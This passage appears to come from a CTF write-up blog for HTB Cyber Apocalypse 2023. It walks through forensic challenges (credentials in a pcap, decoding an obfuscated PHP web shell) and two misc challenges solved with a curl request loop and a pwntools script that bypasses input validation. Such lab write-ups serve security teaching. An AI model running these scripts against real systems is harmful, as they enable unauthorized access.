main(sys.argv)</span><br></pre></td></tr></table></figure>


<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="Plaintext-Tleasure"><a href="#Plaintext-Tleasure" class="headerlink" title="Plaintext Tleasure"></a>Plaintext Tleasure</h2><blockquote>
<p>Threat intelligence has found that the aliens operate through a command and control server hosted on their infrastructure. Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server’s administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin.</p>
</blockquote>
<p>filtering the traffic to http and following through TCP stream at stream 4 we found FLAG </p>
<p><img src="/imgs/post3/forensic/plaintext_t.png" alt="plaintext_t"></p>
<h2 id="Alien-Cradle"><a href="#Alien-Cradle" class="headerlink" title="Alien Cradle"></a>Alien Cradle</h2><p>given powershell file that contain flag itself</p>
<p><img src="/imgs/post3/forensic/alien_cradle.png" alt="alien_cradle"></p>
<h2 id="Extraterrestrial-Persistence"><a href="#Extraterrestrial-Persistence" class="headerlink" title="Extraterrestrial Persistence"></a>Extraterrestrial Persistence</h2><p>given shell script that writting some base64 strings to somewhere in system that contain flag as Description</p>
<p><img src="/imgs/post3/forensic/extraterrestrial_persistence.png" alt="extraterrestrial_persistence"></p>
<h2 id="Rotten"><a href="#Rotten" class="headerlink" title="Rotten"></a>Rotten</h2><blockquote>
<p>The iMoS is responsible for collecting and analyzing targeting data across various galaxies. The data is collected through their webserver, which is accessible to authorized personnel only. However, the iMoS suspects that their webserver has been compromised, and they are unable to locate the source of the breach. They suspect that some kind of shell has been uploaded, but they are unable to find it. The iMoS have provided you with some network data to analyse, its up to you to save us.</p>
</blockquote>
<p>By reading Description it seems like we have to look for the shell that has uploaded as webserver has been compromised </p>
<p>as previous pcap challenge i started inspecting through tcp stream but nothing usefull after checking for a while, as shell upploaded on webserver it must be likely php file and we can export all file being transfered via Export Objects.</p>
<p>so started searching for any promising file name as there was lots of file it took time and finally i came across “map-update.php” file it has several file with same name but the size with 7,178 bytes was interesting.</p>
<p>it seems obfuscated, However after deobfuscate it didn’t change going through the code i looks like this gibberish value are being cocatinated one after another and finally printed</p>
<p><img src="/imgs/post3/forensic/rotten_1.png" alt="rotten_1"></p>
<p>running php file </p>
<p><img src="/imgs/post3/forensic/rotten_2.png" alt="rotten_2"></p>
<p>it found dificulty with <code>eval()</code> function so i changed it to <code>echo</code> as its used for printing the content<br>and after running the file it indeed worked and got flag in file.</p>
<p><img src="/imgs/post3/forensic/rotten_3.png" alt="rotten_3"></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h2><p>The aim of this task was to create a program that can automatically send a large number of requests (around one thousand) to an endpoint called &#x2F;flag. Eventually, the endpoint will respond with the correct flag. The following script can be utilized for this purpose.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="number">1200</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        curl -s -X GET http://142.93.35.133:32034/flag</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="Janken"><a href="#Janken" class="headerlink" title="Janken"></a>Janken</h2><p>this challenge has Rock-Paper-Scissor game on server and we have to win the game for 100(around i don’t remeber ) times in streak, However program had bug we made able to bypass the input validation by entering all word at once. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;64.227.41.83&#x27;</span>,<span class="number">30145</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">info(<span class="string">&quot;Wait till you get the flag :) &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        step = <span class="number">100</span>-i</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; step closer to your flag&quot;</span>.<span class="built_in">format</span>(step))</span><br><span class="line">        <span class="comment">#recieve input interface</span></span><br><span class="line">        p.recv()</span><br><span class="line">        <span class="comment">#time.sleep(1)</span></span><br><span class="line">        p.sendline(<span class="string">&quot;rockpaperscissors&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;prize: &#x27;</span>)</span><br><span class="line">flag = p.recv()</span><br><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;\n\n\tflag : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure>


<p><img src="/imgs/post3/misc/janken_misc.gif" alt="janken_misc"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archive">Writing</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GettingStarted"><span class="toc-number">1.1.</span> <span class="toc-text">GettingStarted</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Questionnaire"><span class="toc-number">1.2.</span> <span class="toc-text">Questionnaire</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Labyrinth"><span class="toc-number">1.3.</span> <span class="toc-text">Labyrinth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pandora-Box"><span class="toc-number">1.4.</span> <span class="toc-text">Pandora Box</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Requirement-for-ret2libc"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Requirement for ret2libc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Void"><span class="toc-number">1.5.</span> <span class="toc-text">Void</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">Method 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-4"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sources"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">Sources :</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2"><span class="toc-number">1.5.2.</span> <span class="toc-text">Method 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-5"><span class="toc-number">1.5.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-Room"><span class="toc-number">1.6.</span> <span class="toc-text">Control Room</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Leaking-the-libc-address"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">Leaking the libc address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Gaining-Shell"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">Gaining Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-Payload"><span class="toc-number">1.6.1.</span> <span class="toc-text">Final Payload:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rev"><span class="toc-number">2.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shattered-tablet"><span class="toc-number">2.1.</span> <span class="toc-text">Shattered tablet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Needle-in-a-Haystack"><span class="toc-number">2.2.</span> <span class="toc-text">Needle in a Haystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hunting-License"><span class="toc-number">2.3.</span> <span class="toc-text">Hunting License</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve"><span class="toc-number">2.3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#She-Shells-C-Shells"><span class="toc-number">2.4.</span> <span class="toc-text">She Shells C Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cave-System"><span class="toc-number">2.5.</span> <span class="toc-text">Cave System</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensic"><span class="toc-number">3.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Plaintext-Tleasure"><span class="toc-number">3.1.</span> <span class="toc-text">Plaintext Tleasure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alien-Cradle"><span class="toc-number">3.2.</span> <span class="toc-text">Alien Cradle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extraterrestrial-Persistence"><span class="toc-number">3.3.</span> <span class="toc-text">Extraterrestrial Persistence</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rotten"><span class="toc-number">3.4.</span> <span class="toc-text">Rotten</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Persistence"><span class="toc-number">4.1.</span> <span class="toc-text">Persistence</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Janken"><span class="toc-number">4.2.</span> <span class="toc-text">Janken</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2023/04/08/post3/ca_2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&text=CTF WriteUp: HTB CA 2023"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&is_video=false&description=CTF WriteUp: HTB CA 2023"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF WriteUp: HTB CA 2023&body=Check out this article: https://sf4ult.github.io/2023/04/08/post3/ca_2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&title=CTF WriteUp: HTB CA 2023"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&name=CTF WriteUp: HTB CA 2023&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2023/04/08/post3/ca_2023/&t=CTF WriteUp: HTB CA 2023"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    Durgesh
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archive">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
